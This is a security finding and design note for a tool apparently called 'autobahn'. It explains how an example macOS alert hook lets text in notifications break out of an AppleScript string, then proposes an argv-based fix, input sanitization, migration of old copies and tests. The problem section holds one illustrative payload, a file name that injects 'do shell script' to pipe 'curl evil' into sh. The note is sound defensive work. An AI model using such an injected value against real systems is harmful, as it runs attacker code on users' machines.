# F-H27: The example alert hook passes text as data, not AppleScript

**Findings:** H-27 (GLM H1; DEEPSEEK F9; OPUS S9).
**Status:** proposed. High; fix before v1.

## Problem

`autobahn init` writes an example hook to `~/.autobahn/on-alert.sh`, from `ON_ALERT_EXAMPLE` (`src/config.rs:~150-170`). On macOS, when `terminal-notifier` is absent, which is the default, the hook falls back to:

```sh
exec /usr/bin/osascript \
    -e "display notification \"$AUTOBAHN_SUMMARY\" with title \"autobahn\""
```

Nothing escapes a `"` or a `\` in the summary. The summary includes session error text, and that text can include file names the peer chose. A file named `x" & (do shell script "curl evil|sh") & "` therefore ends the AppleScript string early. The rest runs as AppleScript, and `do shell script` runs a shell command as the local user on the next alert.

The dispatcher itself is safe: it passes values as environment variables and never interpolates them into the hook command (`src/alerts.rs:486-496`). The tray also escapes correctly (`src/tray.rs:786`). Only the example hook is wrong, and it only runs if the user pointed `on_alert` at it. The template ships that line commented out.

## Proposed resolution

- **Pass the text as an argument.** Change the example so AppleScript reads the summary as an argument, never as part of its source:
  ```sh
  exec /usr/bin/osascript \
      -e 'on run argv' \
      -e 'display notification (item 1 of argv) with title "autobahn"' \
      -e 'end run' \
      "$AUTOBAHN_SUMMARY"
  ```
- **Sanitize at the source as well.** When composing `AUTOBAHN_SUMMARY` and `AUTOBAHN_DETAIL` (`src/alerts.rs:330-350`, `src/supervisor/mod.rs:~1909`), strip control characters and cap the length, using the helper from F-M-OUT. User-written hooks with the same unsafe shape then get the same protection. Don't escape quotes here: a correct hook passes text as data, and escaping would garble it for such hooks.
- **Existing copies.** A user who ran `init` before the fix still has the old script. At supervisor startup, if `on_alert` points at a file whose contents exactly match a previously shipped example, rewrite it to the new version and log that it was rewritten. A script that differs in any way is left alone and gets a one-time warning if it contains the unsafe line.
- **Other shells in the example.** Check the Linux branch too (`notify-send "$AUTOBAHN_SUMMARY"` is safe as argv).

## Tests

- Run the example hook, with `osascript` replaced by a stub that prints its arguments, on a summary containing `"`, `\`, `&` and `do shell script`. The stub receives the text as one argument and the script is unchanged.
- A composed summary containing ESC and newline bytes arrives with them stripped.
- A previously shipped example hook file is rewritten at startup; a user-edited one isn't.
- `the_example_scripts_are_valid_shell` still passes.
